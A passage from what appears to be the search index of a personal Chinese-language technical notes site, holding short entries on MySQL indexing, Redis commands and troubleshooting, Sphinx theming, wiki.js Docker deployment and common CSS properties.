当唯一性是某种数据本身的特征时(比如下单日期可以)，指定唯一索引。使用唯一索引需能确保定义的列的数据完整性，以提高查询速度; 搜索的索引列，不一定是所要选择的列; 换句话说，最适合索引的列是出现在WHERE子句中的列，或连接子句中指定的列，而不是出现在SELECT关键字后的选择列表中的列; 使用短索引; 如果对字符串列进行索引，应该指定一个前缀长度，只要有可能就应该这样做; 例如，有一个CHAR(200)列，如果在前10个或20个字符内，多数值是唯一的，那么就不要对整个列进行索引; 对前10个或20个字符进行索引能够节省大量索引空间，也可能会使查询更快; 较小的索引涉及的磁盘 IO 较少，较短的值比较起来更快; 更为重要的是，对于较短的键值，索引高速缓存中的块能容纳更多的键值， 因此，MySQL 也可以在内存中容纳更多的值。这样就增加了找到行而不用读取索引中较多块的可能性; 对于InnoDB存储引擎的表，记录默认会按照一定的顺序保存; 如果有明确定义的主键，则按照主键顺序保存; 如果没有主键，但是有唯一索引，那么就是按照唯一索引的顺序保存; 如果既没有主键又没有唯一索引，那么表中会自动生成一个内部列，按照这个列的顺序保存; 按照主键或者内部列进行的访问是最快的，所以InnoDB表尽量自己指定主键， 当表中同时有几个列都是唯一的，都可以作为主键的时候， 要选择最常作为访问条件的列作为主键，提高查询的效率; 另外，还需要注意，InnoDB 表的普通索引都会保存主键的键值， 所以主键要尽可能选择较短的数据类型，可以有效地减少索引的磁盘占用，提高索引的缓存效果 创建索引 显示索引信息: # SHOW INDEX 命令 mysql> SHOW INDEX FROM table_name\\G 几种方式通过修改表结构增加索引: # 添加一个主键，这意味着索引值必须是唯一的，且不能为NULL ALTER TABLE tbl_name ADD PRIMARY KEY (column_list); # 创建索引的值必须是唯一的（除了NULL外，NULL可能会出现多次） ALTER TABLE tbl_name ADD UNIQUE index_name (column_list); # 添加普通索引，索引值可出现多次 ALTER TABLE tbl_name ADD INDEX index_name (column_list); # 指定了索引为 FULLTEXT ，用于全文索引 ALTER TABLE tbl_name ADD FULLTEXT index_name (column_list) 使用 ALTER 命令添加和删除主键: mysql> ALTER TABLE testalter_tbl MODIFY i INT NOT NULL; mysql> ALTER TABLE testalter_tbl ADD PRIMARY KEY (i); # 删除主键时只需指定PRIMARY KEY，但在删除索引时，你必须知道索引名。 mysql> ALTER TABLE testalter_tbl DROP PRIMARY KEY; 普通索引 这是最基本的索引，它没有任何限制。它有以下几种创建方式: CREATE INDEX indexName ON table_name (column_name) 如果是CHAR，VARCHAR类型，length可以小于字段实际长度； 如果是BLOB和TEXT类型，必须指定 length。 修改表结构(添加索引): ALTER table tableName ADD INDEX indexName(columnName) 创建表的时候直接指定: CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, INDEX [indexName] (username(length)) ); 删除索引的语法: DROP INDEX [indexName] ON mytable; 唯一索引 创建: CREATE UNIQUE INDEX indexName ON mytable(username(length)) 修改表结构: ALTER table mytable ADD UNIQUE [indexName] (username(length)) 创建表的时候直接指定: CREATE TABLE mytable( ID INT NOT NULL, username VARCHAR(16) NOT NULL, UNIQUE [indexName] (username(length)) ); 索引失效 查询条件包含or，可能导致索引失效 如果字段类型是字符串，where时一定用引号括起来，否则会因为隐式类型转换，索引失效 like通配符可能导致索引失效。 联合索引，查询时的条件列不是联合索引中的第一个列，索引失效。 在索引列上使用mysql的内置函数，索引失效。 对索引列运算（如，+、一、 * 1，索引失效。 索引字段上使用（！=或者<>，not in）时，可能会导致索引失效。 索引字段上使用is null，is not null，可能导致索引失效。 左连接查询或者右连接查询查询关联的字段编码格式不一样，可能导致索引失效。 MySQL优化器估计使用全表扫描要比使用索引快，则不使用索引。","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-index.html","loc":"/yq-doc-source-docs-database-mysql-index.html"},{"title":"其他问题","text":"联合索引的实现 按照每一个索引的顺序来进行排序, 如 (A, B, C) , 先按A排序, A相等就看B, 要是ABC都相等, 就看主键 创建联合索引: KEY `idx_name_age_position` (`name`, `age`, `position`) USING BTREE 如何查询SQL执行计划 EXPLAIN 加 数据库语句 一些原则 高并发场景下, 数据库尽量不要多表关联, 比如阿里就禁止超过三张表的JOIN 因为会降低DB性能 对于高并发来说, DB卡死, 基本上依赖这个DB的都会被影响, 大部分都是采取, 将数据的整合转移到WEB应用上去, 因为WEB有瓶颈了, 扩容WEB就行等... binlog 可以开启binlog日志, 可以记录对数据库的增删改操作. 删库跑路啥的, 有binlog可以尝试恢复. 数据库CPU飙升 排查过程 使用top 命令观察，确定是 mysqld 导致还是其他原因。 如果是 mysqld 导致的，show processlist，查看 session 情况，确定是不是有消耗资源的 sql 在运行。 找出消耗高的sql，看看执行计划是否准确，索引是否缺失，数据量是否太大。 处理 kill掉这些线程（同时观察 cpu 使用率是否下降）， 进行相应的调整（比如说加索引、改sq、改内存参数） 重新跑这些 SQL。 其他情况 也有可能是每个 sq|消耗资源并不多，但是突然之间，有大量的 session 连进来导致cpu 飙升， 这种情况就需要跟应用一起来分析为何连接数会激增，再做出相应的调整，比如说限制连接数等。 G和g作用 其实是: \\g 和 \\G \\g 表示在MySQL的sql语句后加上 \\g ，效果等同于加上定界符，一般默认的定界符是分号; 可以兼容特意修改了定界符的情况; \\G 在MySQL的sql语句后加上 \\G ，表示将查询结果进行按列打印，可以使每个字段打印到单独的行。 因为如果不这样, 有些表列很多, 会有折行, 阅读不友好.","tags":"数据库","url":"/yq-doc-source-docs-database-mysql-other-problems.html","loc":"/yq-doc-source-docs-database-mysql-other-problems.html"},{"title":"遇到过的问题","text":"connection 127.0.0.0:6379 refused 连接本地redis服务端失败 查到的主要就是服务端没有启动成功 可能是bind 还需要绑定本机ip: bind 127.0.0.1,$ip 也可能是需要开始自动后台运行：daemonize（守护进程）: daemonize yes aof文件：记录redis数据的变动情况 如果是宕机，可能是aof（append only file）文件存在错误导致redis-server没有启动成功 需要执行: # 询问是否修复（交互命令） redis-check-aof --fix aof文件名 # 报告aof文件错误 redis-check-aof aof文件名","tags":"数据库","url":"/yq-doc-source-docs-database-redis-I-have-encountered-problems.html","loc":"/yq-doc-source-docs-database-redis-I-have-encountered-problems.html"},{"title":"redis","text":"Redis 常用五大数据类型: String List (比如消息队列) Set (比如关注列表) Hash (复杂最想存储) Zset（有序集合）SortSet (比如排行榜) aof文件：记录redis数据的变动情况 注解 redis的key支持设置过期策略. 按照性能分类 单机 主从 高可用 (Redis集群) 待看: 美团万亿级 KV 存储架构与实践 阿里云Redis 好处? 距离, 电商为什么会用redis做消息系统，微服务下的高并发架构 (作为消息中心, 生产者消费者中介) 单机就能支持10w并发(标准8核16G) docker 部署 先去 redis官网 下载一个配置文件, 因为官方docker镜像内没有 按需修改配置文件, 注意默认不设置守护线程: daemonize no 这个不要改, 改了docker启动不了... 启动: docker run --name myredis -p 6379:6379 -d \\ -v /Users/yanque/project/code/moment-management/src/conf:/usr/local/etc/redis \\ redis redis-server /usr/local/etc/redis/redis.conf redis-server /usr/local/etc/redis/redis.conf 表示使用此配置文件. 也可以后面进入shell手动执行","tags":"数据库","url":"/yq-doc-source-docs-database-redis-redis.html","loc":"/yq-doc-source-docs-database-redis-redis.html"},{"title":"使用","text":"相关命令 redis-benchmark redis性能测试 redis-check-aof 校验aof文件完整性 redis-check-rdb 检查rdb redis-cli 命令行交互式打开使用 redis-sentinel 哨兵, 与服务是一个 redis-server 服务. 启动redis可以使用: redis-server [conf-file] docker安装的redis结构 redis-cli交互指令 redis-cli -h 主机 -p 端口 -a 密码 --raw 当输出结果有中文的时候, 默认输出是16进制, 加此选项, 解码为中文显示 也可以直接跟在redis-cli后面直接执行: redis-cli --raw get $key 关闭redis: redis shutdown 不建议直接kill, 会丢失内存数据 交互式操作 dbsize 查看当前存储的key数量 keys 查看所有key: keys * flushdb 清空当前会话的数据 auth 账户验证登陆 type 查看指定key数据类型 object encoding 查看key对应数据底层结构. 如: object encoding $key String操作 set 设置key-value 语法: set key value [EX seconds|PX milliseconds|EXAT timestamp|PXAT milliseconds-timestamp|KEEPTTL] [NX|XX] [GET] 参数选项说明 key 设置的键名 value 键对应的值 EX seconds 可选参数，过期时间, 单位秒 PX milliseconds 可选参数，过期时间, 单位毫秒, 与EX二选一即可 EXAT timestamp 可选参数，时间戳 PXAT milliseconds-timestamp 可选参数，毫秒级时间戳 KEEPTTL 可选参数，保持键的现有过期时间不变。 NX 可选参数，如果要设置的key不存在才设置, 仅使用此选项, 与 setnx 效果一致 XX 可选参数，仅在键已存在时设置键的值（即执行 \"SET IF EXISTS\" 操作）。 GET 可选参数，在设置键的值的同时，获取键的旧值 setnx 与set类似, 不过只有在键key不存在时才设置. 命令来自于 SET if Not eXists 的缩写 命令的返回值: 1：设置成功； 0：key 没有设置成功。 del 删除指定的key exists 判断指定的key是否存在 hincrby 创建指定key的hash表 hexists 判断key对应的hash表中是否存在某个值 expire 指定某个key的过期时间, 单位: 秒 incr 设置某个key自增, 就是每次设置一次后就加一 注解 对于 \"查看指定key数据类型\", 表示key对应的值的数据类型 Hash操作 HMSET hash, 批量存储 HMGET hash, 批量获取 List操作 一览 LPUSH RPUSH LPOP RPOP LRANGE BLPOP BRPOP 将一个或多个值value插入到key列表的表头（最左边）: LPUSH key value [value ...] 将一个或多个值value插入到key列表的表尾（最右边）: RPUSH key value [value ...] 移除并返回key列表的头元素: LPOP key 移除并返回key列表的尾元素: RPOP key 返回列表key中指定区间内的元素，区间以偏移量start和stop指定: LRANGE key start stop 从key列表表头弹出一个元素，若列表中没有元素，阻塞等待 timeout秒；如果timeout=0， 直阻塞等待: BLPOP key [key ...] timeout 从key列表表尾弹出一个元素，若列表中没有元素，阻塞等待 timeout秒；如果timeout=0，一直阻塞等待: BRPOP key [key ...] timeout 常用分布式数据结构 栈: Stack = LPUSH + LPOP 队列: Queue = LPUSH + RPOP 阻塞队列: Blocking MQ = LPUSH + BRPOP Set操作 一览 SADD SREM SCARD SISMEMBER SRANDMEMBER SPOP 往集合key中存入元素，元素存在则忽略， 若key不存在则新建: SADD key member [member ...] 从集合key中删除元素: SREM key member [member ...] 获取集合key中所有元素: SMEMBERS key 获取集合key的元素个数: SCARD key 判断member元素是否存在于集合key中: SISMEMBER key member 从集合key中选出count个元素(随机选取)，元素不从key中删除: SRANDMEMBER key [count] 从集合key中选出count个元素，元素从key中删除: SPOP key [count] Set运算操作 一览 SINTER SINTERSTORE SUNION SUNIONSTORE SDIFF SDIFFSTORE 交集运算: SINTER key [key ...] 将交集结果存入新集合destination中: SINTERSTORE destination key [key ..] 并集运算: SUNION key [key .] 将并集结果存入新集合destination中: SUNIONSTORE destination key [key ...] 差集运算: SDIFF key [key ...] 将差集结果存入新集合destination中: SDIFFSTORE destination key [key ...] ZSet常用操作 一览 ZADD ZREM ZSCORE ZINCRBY ZCARD ZRANGE ZREVRANGE 与Set的区别就是, 元素插入的时候要提供一个 分值 往有序集合key中加入带分值元素: ZADD key score member [[score member]...] 从有序集合key中删除元素: ZREM key member [member ...] 返回有序集合key中元素member的分值: ZSCORE key member 为有序集合key中元素member的分值加上increment: ZINCRBY key increment member 返回有序集合key中元素个数: ZCARD key 正序获取有序集合key从start下标到stop下标的元素: ZRANGE key start stop [WITHSCORES] 倒序获取有序集合key从start下标到stop下标的元素: ZREVRANGE key start stop [WITHSCORES] Zset集合操作 一览 ZUNIONSTORE ZINTERSTORE 并集计算: ZUNIONSTORE destkey numkeys key [key ...] 交集计算: ZINTERSTORE destkey numkeys key [key ...]","tags":"数据库","url":"/yq-doc-source-docs-database-redis-use.html","loc":"/yq-doc-source-docs-database-redis-use.html"},{"title":"rst主题","text":"参考官方文档: https://www.sphinx-doc.org/en/master/usage/theming.html","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-About-the-topic.html","loc":"/yq-doc-source-docs-document-RST-mark-language-About-the-topic.html"},{"title":"杂乱无章","text":"选项说明 -a command-line option \"a\" -1 file , --one= file , --two file Multiple options with arguments. code Here is a literal block: if literal_block: text = 'is left as-is' spaces_and_linebreaks = 'are preserved' markup_processing = None Data Dict cat: str cat dog: str dog name: str name 类似字典说明 cat: str cat dog: str dog name: str name 引文 Take it away, Eric the Orchestra Leader! A one, two, a one two three four Half a bee, philosophically, must, ipso facto , half not be. But half the bee has got to be, vis a vis its entity. D'you see? Singing...","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Chaotic.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Chaotic.html"},{"title":"doc文档转换为rst","text":"可以使用pandoc, 具有跨平台的支持, 可参考: /docs/操作系统/linux/linux指令/pandoc 注意, doc不能直接转换为rst文档. 需要先转换为docx格式(直接用word/wps打开另存为docx格式即可)","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-DOC-document-convert-to-RST.html","loc":"/yq-doc-source-docs-document-RST-mark-language-DOC-document-convert-to-RST.html"},{"title":"sphinx自定义主题","text":"日期: 2023.02.24 周五 参考: 主题开发 主题目录大概结构: . ├── __init__.py ├── breadcrumbs.html ├── footer.html ├── layout.html ├── search.html ├── searchbox.html 以上几个html文件都是html模版 ├── static 静态资源路径 └── theme.conf 主题配置, ini配置形式 theme.conf 配置 inherit: 继承哪个主题, 主要用于查找缺失的模版 stylesheet: main CSS name pygments_style: 待补充 sidebars: 提供了用逗号分隔的侧边栏模板列表，用于构造提要栏。可以配置 html_sidebars 覆盖此值. [options] 模块用于配置变量的值, 此处设置的值可以被 config.py 定义的 html_theme_options 覆盖. 如: [theme] inherit = base theme stylesheet = main CSS name pygments_style = stylename sidebars = localtoc.html, relations.html, sourcelink.html, searchbox.html [options] variable = default value 配置静态资源 默认情况下, static 目录下的文件会被复制到 _static 若需要使用其他目录下的文件, 可参考此方法: from os import path from sphinx.util.fileutil import copy_asset_file def copy_custom_files(app, exc): if app.builder.format == 'html' and not exc: staticdir = path.join(app.builder.outdir, '_static') copy_asset_file('path/to/myextension/_static/myjsfile.js', staticdir) def setup(app): app.connect('build-finished', copy_custom_files) 模版使用自定义函数 例, 定义函数: # 注册方法 def setup_my_func(app, pagename, templatename, context, doctree): # 模版使用的方法 def my_func(mystring): return \"Your string is %s\" % mystring # 注册到上下文 context['my_func'] = my_func # 配置 def setup(app): app.connect(\"html-page-context\", setup_my_func) 在模版中使用: <div> {{ my_func(\"some string\") }} </div> 基于配置的js脚本 方案一, 使用js_t模版 在 static 目录下配置js模版(以 js_t 为后缀的文件), 此文件最后将会转换为 _static 目录下去掉 _t 后的js文件 如: project/static/test.js_t -> project/_buid/html/_static/test.js 注解 本来就是js文件的会原样复制 方案二, 使用python函数配置 使用 Sphinx.add_js_file() , 需要先在 config.py 配置变量 如, 在 config 配置了变量 my_javascript_variable, 使用以下方式注入 # 读取变量插入到js文件 def add_js_variable(app): # This is a configuration that you've specified for users in `conf.py` js_variable = app.config['my_javascript_variable'] js_text = \"var my_variable = '%s';\" % js_variable app.add_js_file(None, body=js_text) # builder初始化后 执行此方法 def setup(app): # 注入配置变量 app.add_config_value('my_javascript_variable', 0, 'html') # Run the function after the builder is initialized app.connect('builder-inited', add_js_variable) 注解 如果自定义的js文件报错可能会使用基础模版的js","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-Sphinx-custom-theme.html","loc":"/yq-doc-source-docs-document-RST-mark-language-Sphinx-custom-theme.html"},{"title":"doc -> rst","text":"参考 参考[野火]sphinx文档docxtorst","tags":"文档","url":"/yq-doc-source-docs-document-RST-mark-language-docx-file-conversion-RST.html","loc":"/yq-doc-source-docs-document-RST-mark-language-docx-file-conversion-RST.html"},{"title":"wiki","text":"目前是直接使用的sphinx, 写rst文档, 然后通过build编译称html. 感觉差点意思, 于是找了一下有哪些开源的wiki实现. wiki.js 部署: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=db\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque\" -e \"DB_PASS=wikijsrocks_yanque\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki:2","tags":"文档","url":"/yq-doc-source-docs-document-wiki-wiki.html","loc":"/yq-doc-source-docs-document-wiki-wiki.html"},{"title":"wiki.js","text":"一个开源的 wiki 框架, 支持数据库... 官网/gitthub:: docs-wiki.js github-wiki.js 本地docker部署 部署mysql, 可参考 /docs/容器与集群/docker/docker_store/mysql docker run -d --name mymysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -e MYSQL_DATABASE=yanque_wiki mysql 部署wiki.js: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=172.17.0.1\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque_wiki\" -e \"DB_PASS=yanque_wiki\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki 注意: 这里的 DB_HOST , 一开始只想着数据库已经映射到本地, 脑子抽了写了个 127.0.0.1 , 一直连不上数据库. 如果要设置中文, 不要使用官网文档建议的2的tag(2只有英文), 使用最新的. 待补充...","tags":"文档","url":"/yq-doc-source-docs-document-wiki-wiki.js.html","loc":"/yq-doc-source-docs-document-wiki-wiki.js.html"},{"title":"navigator","text":"navigator 是一个 JavaScript 中的内置对象，提供了与浏览器相关的信息和功能。 它是 window 对象的一个属性，可以通过 window.navigator 或者直接使用 navigator 访问。 navigator 对象包含了许多属性和方法，用于获取和操作与浏览器环境相关的信息。 以下是一些常用的 navigator 属性和方法： navigator.userAgent 返回一个包含用户代理字符串的字符串，其中包含了浏览器的相关信息（如浏览器名称、版本号、操作系统等）。 navigator.platform 返回一个表示用户操作系统平台的字符串（如 \"Win32\"、\"Linux\" 等）。 navigator.language 返回一个表示用户首选语言的字符串，例如 \"en-US\" 表示英语（美国）。 navigator.geolocation 提供了获取用户地理位置信息的功能，包括经度、纬度等。 navigator.cookieEnabled 表示浏览器是否启用了 Cookie。 navigator.onLine 表示浏览器当前是否处于在线状态。 navigator.plugins 返回一个包含浏览器已安装插件的数组。","tags":"前端","url":"/yq-doc-source-docs-front-end-Built--in-function-navigator.html","loc":"/yq-doc-source-docs-front-end-Built--in-function-navigator.html"},{"title":"content","text":"注解 源于AI 在 CSS 中，content 属性用于在伪元素（:before 和 :after）中插入生成的内容。它是一个用于生成内容的内联属性。 通过使用 content 属性，您可以在伪元素中插入文本、图标、计数器或其他生成的内容，从而改变或增强文档的呈现。 下面是一个示例，演示如何使用 content 属性在伪元素中插入文本内容: .element::before { content: \"前缀：\"; } .element::after { content: \"（后缀）\"; } 在上述示例中，我们在 .element 元素的 ::before 伪元素中插入了文本 \"前缀：\"， 在 ::after 伪元素中插入了文本 \"（后缀）\"。 这样，每个 .element 元素都会在其内容之前和之后显示相应的文本。 content 属性可以接受不同类型的值，包括字符串、URL、计数器等。 您可以使用引号将字符串括起来，也可以使用 CSS 函数、变量或其他 CSS 值。 此外，content 属性还可以与其他 CSS 属性一起使用， 例如 display、position、background 等，以控制伪元素的显示和样式。 重要 content 属性仅适用于伪元素（:before 和 :after），不能直接用于真实的 HTML 元素。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html"},{"title":"float","text":"定义元素在哪个方向浮动 如, left（元素向左浮动）、right（元素向右浮动）","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html"},{"title":"justify-content","text":"设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 justify-content 属性用于设置元素在容器的主轴（水平轴）上的对齐方式。 它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。 当你将一个元素的 /docs/前端/css/css常用属性/display 属性设置为 flex 或 inline-flex 时， 该元素成为一个 flex 容器，它的子元素成为 flex 项目。 常见的值包括： flex-start: 将 flex 项目靠主轴起始位置对齐（默认值，左对齐）。 flex-end: 将 flex 项目靠主轴末尾位置对齐（右对齐）。 center: 将 flex 项目在主轴上居中对齐（居中对齐）。 space-between: 将 flex 项目均匀分布在主轴上，首个项目靠起始位置，末尾项目靠末尾位置（两端对齐，项目之间平均分布）。 space-around: 将 flex 项目均匀分布在主轴上，项目之间和首末项目与容器边界之间的间距相等（项目周围平均分布）。 space-evenly: 将 flex 项目均匀分布在主轴上，包括首末项目与容器边界之间的间距都相等。 示例: .flex-container { display: flex; justify-content: center; } 将 justify-content 设置为 center , flex 容器内的项目将在主轴上居中对齐。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html"},{"title":"place-content","text":"设置 Grid 布局元素在容器中的水平和垂直对齐方式 place-content 属性是 CSS Grid 布局的一个简写属性， 用于同时设置元素在容器中的水平和垂直方向上的对齐方式。 它接受两个值， 第一个值表示水平对齐方式 第二个值表示垂直对齐方式。 例如： place-content: center center; 表示在容器中水平和垂直方向上居中对齐。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html"},{"title":"transition","text":"transition 是 CSS 的属性， 用于定义元素在状态改变时的过渡效果。 通过设置 transition 属性，你可以指定在元素属性发生变化时应用的过渡效果， 包括过渡时间、过渡类型和缓动函数等。 设置元素的过渡属性、过渡时间、过渡类型和延迟时间: transition: property duration timing-function delay;","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html"},{"title":"align-items","text":"设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 align-items 属性用于设置元素在容器的交叉轴（垂直轴）上的对齐方式。 它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。 常见的值包括 flex-start（默认值，顶部对齐）、flex-end（底部对齐）、 center（居中对齐）、baseline（基线对齐，元素的基线对齐）等。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html"},{"title":"background","text":"background属性是一个复合属性，它用于设置元素的背景样式， 包括背景颜色、背景图片、背景重复方式、背景位置等。 你可以通过指定多个值来设置不同的背景属性，例如: background: red url(\"image.jpg\") no-repeat center; 上述代码将把背景颜色设置为红色，背景图片设置为\"image.jpg\"， 并设置不重复背景图片，并将背景图片居中对齐。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background.html"},{"title":"background-color","text":"设置背景色, 一般只要在最外层设置了背景色, 内部没特殊置顶一般都是一个色了貌似","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html"},{"title":"background-image","text":"background-image属性用于单独设置元素的背景图片。 你可以通过指定一个URL值来设置背景图片，例如: background-image: url(\"image.jpg\"); 上述代码将把元素的背景图片设置为\"image.jpg\"。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html"},{"title":"border-radius","text":"设置元素的边框圆角效果, 使元素的边框角变得圆滑，而不是默认的直角。 border-radius 属性可以应用于元素的四个角，也可以应用于单个角。 它接受一个或多个长度值或百分比值作为参数，用于指定圆角的半径大小。 常见使用方式和效果： 设置统一的圆角半径, 使 .element 元素的四个角都具有 10px 的圆角: .element { border-radius: 10px; } 设置水平和垂直方向上不同的圆角半径, 使 .element 元素的左上角和右下角分别具有 10px 和 20px 的圆角。: .element { border-radius: 10px 20px; } 设置单个角的圆角半径, 使 .element 元素的左上角具有 10px 的圆角，右下角具有 20px 的圆角，而其余两个角则保持直角: .element { border-radius: 10px 0 0 20px; }","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-border-radius.html"},{"title":"box-shadow","text":"给元素添加阴影. 阴影填充的位置为 /docs/前端/css/css常用属性/padding 所处位置","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html"},{"title":"clip","text":"clip 是一个 CSS 属性，用于指定元素的裁剪区域，即确定元素在页面上显示的部分。 它可以用来隐藏元素的一部分内容或者创建非矩形的可视区域。 clip 属性需要配合 position: absolute; 或者 position: fixed; 使用 ， 因为只有绝对定位或固定定位的元素才能裁剪。 clip 属性可以使用以下两种方式进行设置： rect() 使用 rect() 函数: .element { position: absolute; clip: rect(top, right, bottom, left); } 其中，top、right、bottom 和 left 是裁剪区域的边界值，可以使用像素（px）或百分比（%）来指定。 auto 使用 auto 关键字: .element { position: absolute; clip: auto; } 当使用 clip: auto; 时，元素将不会被裁剪，显示完整的内容。 当使用 clip: rect(auto, auto, auto, auto); 时，元素将根据其定位和尺寸进行自动裁剪。 注解 clip 属性在 CSS3 中已被废弃，不推荐使用。 推荐使用更强大和灵活的 clip-path 属性来实现更复杂的裁剪效果。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html"},{"title":"color","text":"设置文字颜色","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html"},{"title":"cursor","text":"cursor 用于指定鼠标指针在元素上的外观。 通过设置 cursor 属性，你可以改变用户与特定元素交互时鼠标指针的样式，以提供视觉反馈或指示元素的可操作性。 cursor 属性的值可以是以下之一： 预定义光标 pointer（手型光标，表示链接或可点击元素） default（默认光标） text（文本输入光标）等。 CSS 光标值（Cursor values） 通过指定一个 URL，使用自定义图像作为光标。 使用名为 \"cursor.png\" 的图像作为光标， 并设置 auto 作为回退值（如果图像无法加载，则使用默认光标）: cursor: url(cursor.png), auto; 系统光标: cursor 属性还支持指定系统光标样式，如 crosshair（十字线）、help（帮助光标）、move（移动光标）等。 这些样式会根据操作系统和浏览器的不同而有所变化: cursor: crosshair;","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html"},{"title":"display","text":"设置元素是否被视为块或者内联元素以及用于子元素的布局，例如流式布局、网格布局或弹性布局; 默认: inline none 此元素不会被显示 block 此元素将显示为块级元素，此元素前后会带有换行符 inline 默认。此元素会被显示为内联元素，元素前后没有换行符 inline-block 行内块元素。（CSS2.1 新增的值） list-item 此元素会作为列表显示 run-in 此元素会根据上下文作为块级元素或内联元素显示 compact CSS 中有值 compact，不过由于缺乏广泛支持，已经从 CSS2.1 中删除 marker CSS 中有值 marker，不过由于缺乏广泛支持，已经从 CSS2.1 中删除 table 此元素会作为块级表格来显示（类似 <table>），表格前后带有换行符 inline-table 此元素会作为内联表格来显示（类似 <table>），表格前后没有换行符 table-row-group 此元素会作为一个或多个行的分组来显示（类似 <tbody>） table-header-group 此元素会作为一个或多个行的分组来显示（类似 <thead>） table-footer-group 此元素会作为一个或多个行的分组来显示（类似 <tfoot>） flow-root 生成一个块级元素盒，其会建立一个新的块级格式化上下文，定义格式化上下文的根元素 table-row 此元素会作为一个表格行显示（类似 <tr>） table-column-group 此元素会作为一个或多个列的分组来显示（类似 <colgroup>） table-column 此元素会作为一个单元格列显示（类似 <col>） table-cell 此元素会作为一个表格单元格显示（类似 <td> 和 <th>） table-caption 此元素会作为一个表格标题显示（类似 <caption>） inherit 规定应该从父元素继承 display 属性的值 flex: Flexible Box的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性。 设为Flex布局以后，子元素的float、clear和vertical-align属性将失效 对于 flex, 还有以下拓展属性 flex-direction容器内元素的排列方向(默认横向排列) flex-wrap 容器内元素的换行(默认不换行) justify-content 元素在X轴上的排列. 支持的值: flex-start: Flex项向行头紧挨着填充。这个是默认值。 flex-end: Flex项向行尾紧挨着填充。 center: Flex项居中紧挨着填充。 space-between: Flex项平分剩余空间。 space-around: Flex项平分剩余空间,空间在Flex项之间。 space-evenly: Flex项平分剩余空间,空间在Flex项及边缘之间。 align-items 元素在Y轴方向上的对齐方式 align-content 在弹性容器内的元素没有占用交叉轴上所有可用的空间时对齐容器内的各项（垂直） 如 parent 下的子元素上下左右都居中: .parent { display: flex; justify-content: center; align-items: center; } 或者: .parent { display: flex; flex-direction: center; place-content: center; // justify-content: center; align-items: center; width: 100%; height: 100%; }","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html"},{"title":"font-weight","text":"字重, 可以理解为字体粗细程度, 数值越高表示字体越粗 数值范围从 100 到900，增量为 100。 正常粗细的值是 400，而 700 的值被认为是粗体。 一些常用的关键字值包括 bold、bolder、lighter 和 normal。","tags":"前端","url":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html","loc":"/yq-doc-source-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html"},{"title":"margin","text":"外边距 注解 